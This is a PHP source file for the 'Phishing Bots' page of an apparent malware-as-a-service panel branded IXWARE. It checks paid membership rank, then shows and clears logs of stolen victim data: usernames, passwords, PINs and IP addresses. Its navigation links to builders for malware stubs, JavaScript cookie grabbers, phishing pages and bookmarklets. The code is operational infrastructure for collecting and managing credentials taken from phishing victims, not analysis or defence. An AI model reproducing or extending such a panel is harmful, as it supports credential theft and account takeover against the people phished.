<?php 
      @session_start();
      $title = 'Phishing Bots';
      include_once 'includes/layout/header.php';
      include_once 'includes/checks.php';

      $getRank = pdoQuery($db, "SELECT `rank` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $activated = pdoQuery($db, "SELECT `expireActivate` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $discordID = pdoQuery($db, "SELECT `discordID` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
      $banned = pdoQuery($db, "SELECT `banned` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn(0);

      if($banned != 0){
          
          header("location: support");
          exit();
      }
      if($activated != 0){
        header('Location: dashboard?activate');
        die();
      }
      if($discordID == 0){
        header('Location: settings.php?id');
        die();
      }
      if($getRank != "Premium"){
        if($getRank != "Admin"){
          header('Location: dashboard');
          die();
        }
      }
       
      if (!empty($_POST['removeBot'])){
            $id = htmlspecialchars($_POST["botID"]);

            if (checkpsID($id) == 1){
                $PDORemove = $db -> prepare('DELETE FROM `phishing_logs` WHERE `botID` = :botID');
                $PDORemove -> execute(array(':botID' => $id));

                $success = "Successfully removed bot!";
            }else{
                $error = "Unauthorized";
            }
      }
      if (isset($_POST['clearPS'])){

        if (!empty($_POST['clearPS'])){
    
            if (\Volnix\CSRF\CSRF::validate($_POST)) {
    
              if($getRank == "Premium" || $getRank == "Admin"){
    
                if(checkpsOwner(htmlspecialchars($_SESSION['ID'])) != 0){
    
                  $get = pdoQuery($db, "SELECT * FROM `phishing_logs` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])]);
                  $results = $get->fetchAll(PDO::FETCH_ASSOC);
                  $row = $get->rowCount();
              
                  foreach($results as $result){
                      $userID = htmlspecialchars($result['id']);
              
                      $PDODelete = $db -> prepare('DELETE FROM `phishing_logs` WHERE `id` = :id');
                      $PDODelete -> execute(array(':id' => $userID));  
                  }
                  $success = "Successfully removed all phishing bots";
              }else{
                  $error = "No phishing bots found";
              }
            }else{
              $error = "You don't have any membership.";
            }
          }else{
            header("HTTP/1.1 401 Unauthorized");
            echo file_get_contents('includes/layout/error/401.php');
            die();
          }
        }
      }
      if(isset($_SESSION['username'])){
        $username = htmlspecialchars($_SESSION['username']);
      }else{
        $username = "Unknown";
      }
?>

  <body class="bg-dark">
  <!--Main Navigation-->
  <header>
    <!-- Sidenav -->
    <nav id="sidenav-1" class="sidenav bg-dark" data-hidden="false" data-accordion="true">
      <a class="ripple d-flex justify-content-center py-4" href="#!" data-ripple-color="primary">
        <img id="IXWARE Logo" src="resources/img/ixwarelogogif.gif" alt="IX Logo" draggable="false" class="same-size-logo" />
      </a>

      <ul class="sidenav-menu">
        <li class="sidenav-item ml-4 mt-2 mb-1 text-white">
          <span>General</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="dashboard">
            <i class="fas fa-tachometer-slow fa-fw mr-3"></i><span>Dashboard</span>
          </a>
        </li>
        <?php
          if ($getRank == "User" || $getRank == "Admin"){
            echo "<li class='sidenav-item'>
            <a class='sidenav-link' href='purchase'>
              <i class='fas fa-shopping-basket fa-fw mr-3'></i><span>Purchase</span>
            </a>
          </li>";
          }
        ?>
        <li class="sidenav-item ml-4 mt-4 mb-1 text-white">
          <span>Managing</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-users fa-fw mr-3"></i><span>Bots</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                 <a class='sidenav-link' href='bots'>Stubs <span class='badge bg-danger ml-2' id='bot-logs'>0</span></a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBots'>Javascript <span class='badge bg-danger ml-2' id='cookie-logs'>0</span></a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link active' href='psBots'>Phishing <span class='badge bg-danger ml-2' id='ps-logs'>0</span></a>
                </li>";
              }elseif($getRank == "User"){

                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBots'>Javascript <span class='badge bg-danger ml-2' id='cookie-logs'>0</span></a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-shield-virus fa-fw mr-3"></i><span>Builder</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='builder'>Stub</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilder'>Javascript</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBuilder'>Phishing</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='bmBuilder'>Bookmark</a>
                </li>";
              }elseif($getRank == "User"){
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilder'>Javascript</a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-file-download fa-fw mr-3"></i><span>Builds</span>
          </a>
          <ul class="sidenav-collapse">
            <?php
              if ($getRank == "Premium" || $getRank == "Admin"){
                
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='builds'>Stub</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilds'>Javascript</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='psBuilds'>Phishing</a>
                </li>";
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='bmBuilds'>Bookmark</a>
                </li>";
              }elseif($getRank == "User"){
                echo "<li class='sidenav-item'>
                <a class='sidenav-link' href='jsBuilds'>Javascript</a>
                </li>";
              }
            ?>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-tools fa-fw mr-3"></i><span>Tools</span>
          </a>
          <ul class="sidenav-collapse">
            <li class='sidenav-item'>
              <a class='sidenav-link' href='watchlist'>Watchlist</a>
            </li>
          </ul>
        </li>
        <li class="sidenav-item ml-4 mt-4 mb-1 text-white">
          <span>Account</span>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link">
            <i class="fas fa-sliders-h fa-fw mr-3"></i><span>Settings</span>
          </a>
          <ul class="sidenav-collapse">
            <li class="sidenav-item">
              <a class="sidenav-link" href="settings">General</a>
            </li>
            <li class="sidenav-item">
              <a class="sidenav-link" href="builder-settings">Builder</a>
             </li>
          </ul>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="ix-licenses">
            <i class="fab fa-keycdn fa-fw mr-3"#></i><span>Licenses</span>
          </a>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="support">
            <i class="fas fa-question-circle fa-fw mr-3"#></i><span>Support</span>
          </a>
        </li>
        <li class="sidenav-item">
          <a class="sidenav-link" href="logout">
            <i class="fal fa-sign-out fa-fw mr-3"></i><span>Logout</span>
          </a>
        </li>
      </ul>
    </nav>
    <!-- Sidenav -->

    <!-- Navbar -->
    <nav
      id="main-navbar"
      class="navbar navbar-expand-lg navbar-light fixed-top bg-dark"
    >
      <!-- Container wrapper -->
      <div class="container-fluid">
        <nav aria-label="breadcrumb">
          <ol class="breadcrumb">
            <li class="breadcrumb-item text-white">Javascript Bots</li>
          </ol>
        </nav>
        <!-- Toggler -->
        <button
          data-toggle="sidenav"
          data-target="#sidenav-1"
          class="btn shadow-0 p-0 mr-3 d-block d-xxl-none"
          aria-controls="#sidenav-1"
          aria-haspopup="true"
        >
          <i class="fas fa-bars fa-lg"></i>
        </button>

        <!-- Right links -->
        <ul class="navbar-nav ml-auto d-flex flex-row">

          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0 mt-2 text-white">
              <?= $username ?>
            </a>
          </li>
          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0 mt-2">
              <?php
                if ($getRank == "User"){
                  echo "<span class='badge bg-light text-dark'>Default</span>";
                }elseif ($getRank == "Admin"){
                  echo "<span class='badge bg-danger'>Administrator</span>";
                }elseif ($getRank == "Premium"){
                  echo "<span class='badge bg-warning text-dark'>Premium</span>";
                }
              ?>
            </a>
          </li>
          <!-- Icon -->
          <li class="nav-item">
            <a class="nav-link mr-3 mr-lg-0">
              <?php
		            $getAvatar = pdoQuery($db, "SELECT `avatarURL` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
                $av = htmlspecialchars($getAvatar);
                if ($av == '0' || empty($av)){
                  echo "<img src='resources/img/logo.png' class='img-fluid rounded-circle profile-size' alt='' />";
                }else{
                  echo "<img src='$av' class='img-fluid rounded-circle profile-size' alt='' />";
                }
              ?>
            </a>
          </li>
        </ul>
      </div>
      <!-- Container wrapper -->
    </nav>
    <!-- Navbar -->
  </header>
  <!--Main Navigation-->


  <!--Main layout-->
  <main style="margin-top: 100px" class="d-flex ml-5 mr-5">
    <div class="container-fluid">
        <div class="row">
          <div class="col-xl-8">
            <?php
              if(!empty($error)){
                  echo '<div class="animated fadeIn ml-3">'.error(htmlspecialchars($error)).'</div>';
              }
              if(!empty($success)){
                  echo '<div class="animated fadeIn ml-3">'.success(htmlspecialchars($success)).'</div>';
              }
            ?>
          </div>
        </div>
        <div class="row">
            <div class="col-xl-12">
                <div class="card bg-dark table" style="display:table;">
                  <div class="card-body d-flex flex-column">
                          <div style="display: inline-block;">
                            <form method="POST">
                              <button type="submit" title="Clear all logs" name="clearPS" value="ps" style="border: none; outline: none; background: none; cursor: pointer; color: #fff; text-decoration: underline; font-family: inherit; font-size: inherit;"><i class='fas fa-trash-alt fa-lg text-white float-left'></i></button>
                              <button type="submit" name="downloadPS" style="border: none; outline: none; background: none; cursor: pointer; color: #fff; text-decoration: underline; font-family: inherit; font-size: inherit;"><i class='fas fa-save fa-lg text-white float-left'></i></button>
                              <input type="hidden" name="<?= \Volnix\CSRF\CSRF::TOKEN_NAME ?>" value="<?= \Volnix\CSRF\CSRF::getToken() ?>"/>
                            </form> 
                          </div> 
                          <?php
                            echo "<div class='table-responsive'>";
                              echo "<table id='table-dataTable-ps' class='table table-hover text-darkwhite'>";
                                  echo "<thead class='text-nowrap'>
                                  <tr>
                                    <th scope='col' class='font-weight-bolder'>Avatar</th>
                                    <th scope='col' class='font-weight-bolder'>Username</th>
                                    <th scope='col' class='font-weight-bolder'>Password</th>
                                    <th scope='col' class='font-weight-bolder'>Real Account</th>
                                    <th scope='col' class='font-weight-bolder'>Type</th>  
                                    <th scope='col' class='font-weight-bolder'>Pin</th> 
                                    <th scope='col' class='font-weight-bolder'>IP</th> 
                                    <th scope='col' class='font-weight-bolder'>Date</th>    
                                    <th scope='col' class='font-weight-bolder'>Actions</th>
                                  </tr>
                                  </thead>
                                  <tbody>";
                              echo "</tbody></table>";
                          ?>
                  </div>
                </div>
            </div>
            <?php 
                $usedToken = pdoQuery($db, "SELECT `usedToken` FROM `users` WHERE `id`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn();
                $usedID = pdoQuery($db, "SELECT `id` FROM `users` WHERE `username`=?", [htmlspecialchars($usedToken)])->fetchColumn();
                          
                if(!empty($usedToken) && $usedToken != '0'){
                  echo "<div class='card bg-dark table' style='display: table;'>";
                    echo "<div class='card-body d-flex flex-column'>";
                            echo "<div class='table-responsive'>";
                                echo "<table id='table-dataTable-ps-Shared' class='table table-hover text-darkwhite'>";
                                    echo "<thead class='text-nowrap'>
                                    <tr>
                                      <th scope='col' class='font-weight-bolder'>Avatar</th>
                                      <th scope='col' class='font-weight-bolder'>Username</th>
                                      <th scope='col' class='font-weight-bolder'>Password</th>
                                      <th scope='col' class='font-weight-bolder'>Real Account</th>
                                      <th scope='col' class='font-weight-bolder'>Type</th>  
                                      <th scope='col' class='font-weight-bolder'>Pin</th> 
                                      <th scope='col' class='font-weight-bolder'>IP</th> 
                                      <th scope='col' class='font-weight-bolder'>Date</th>    
                                      <th scope='col' class='font-weight-bolder'>Actions</th>
                                    </tr>
                                    </thead>
                                    <tbody>";
                                  echo "</tbody></table>";
                          echo "</div>";
                      echo "</div>";
                  echo "</div>";
                }
                ?>
        </div>
    </div>
  </main>
  <!--Main layout-->

  <?php require_once 'includes/layout/footer.php'; require_once 'includes/realtime.php';?>